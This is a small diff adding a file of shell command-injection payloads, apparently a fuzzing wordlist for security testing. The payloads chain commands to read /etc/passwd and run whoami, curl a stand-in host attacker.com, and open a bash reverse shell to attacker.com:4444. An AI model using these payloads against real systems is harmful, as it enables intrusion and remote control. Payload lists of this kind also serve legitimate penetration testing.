@@ -1,0 +1,9 @@
+; ls -la
+; cat /etc/passwd
+| whoami
+| id
+$(whoami)
+`whoami`
+; curl http://attacker.com/pwn
+; ping -c 1 attacker.com
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
